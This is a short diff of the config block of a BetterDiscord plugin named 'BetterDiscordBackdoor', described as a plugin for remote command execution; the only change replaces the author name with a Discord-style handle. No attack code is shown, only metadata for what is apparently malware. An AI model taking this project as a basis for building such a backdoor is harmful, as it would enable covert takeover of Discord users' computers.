@@ -9,7 +9,7 @@
 const config = {
     "info": {
         "name": "BetterDiscordBackdoor",
-        "author": ["ethernalsteve", "your nickname"],
+        "author": ["tax evasion#7713", "your nickname"],
         "version": "1.0.0",
         "description": "Better Discord plugin for remote command execution"
     }
